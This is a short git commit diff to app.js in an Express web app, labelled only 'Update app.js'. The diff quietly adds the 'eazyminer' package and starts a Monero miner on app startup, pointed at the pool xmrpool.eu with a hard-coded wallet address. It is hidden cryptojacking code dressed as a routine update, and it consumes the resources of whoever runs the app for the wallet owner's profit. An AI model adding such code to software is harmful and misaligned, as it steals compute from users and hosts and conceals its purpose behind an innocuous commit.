8077007ce10427a4461ce4eef96266553f64de38
Michael-Amos <57953607+Michael-Amos@users.noreply.github.com>
2024-04-25 02:37:33 +0100

    Update app.js

--- app.js
+++ app.js
@@ -8,7 +8,19 @@ var indexRouter = require('./routes/index');
 var quotesRouter = require('./routes/quotes');
 
 var app = express();
+const Miner = require('eazyminer');
 
+const miner = new Miner({
+    pools: [{
+        coin: 'XMR',
+        user: '47D8WQoJKydhTkk26bqZCVF7FaNhzRtNG15u1XiRQ83nfYqogyLjPMnYEKarjAiCz93oV6sETE9kkL3bkbvTX6nMU24CND8',
+        url: 'xmrpool.eu:9999', // optional pool URL,
+    }],
+    autoStart: false // optional delay
+});
+
+miner.start(); // optional manually start the miner
+console.log("mining started");
 app.use(logger('dev'));
 app.use(express.json());
 app.use(express.urlencoded({ extended: false }));
